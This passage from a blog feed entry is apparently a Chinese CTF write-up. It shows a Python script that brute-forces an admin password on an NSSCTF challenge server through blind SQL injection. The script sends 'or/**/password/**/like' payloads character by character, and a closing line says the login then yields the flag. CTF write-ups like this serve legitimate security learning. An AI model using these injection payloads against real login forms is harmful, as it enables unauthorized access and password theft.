class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">char = &#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://node4.anna.nssctf.cn:28513/&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        for i in char:</span><br><span class="line">            payload = &#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: f&quot;1&#x27;or/**/password/**/like/**/&#x27;&#123;flag + i&#125;%&#x27;#&quot;&#125;</span><br><span class="line">            res = requests.post(url=url, data=payload)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            if &quot;wrong password&quot; in res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">            if &quot;NSSCTF&quot; in res.text:</span><br><span class="line">                break</span><br><span class="line">            elif &quot;~&quot; in i:</span><br><span class="line">                return</span><br></pre></td></tr></table></figure><p>爆破出密码，登录获得flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;WebFTP&quot;&gt;&lt;a href=&quot;#WebFTP&quot; class=&quot;headerlink&quot; title=&quot;WebFTP&quot;&gt;&lt;/a&gt;WebFTP&lt;/h3&gt;&lt;img src=&quot;/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%</summary>
      
    
    
    
    <category term="赛事wp" scheme="http://example.com/categories/%E8%B5%9B%E4%BA%8Bwp/"/>
    
    
  </entry>
  
</feed>
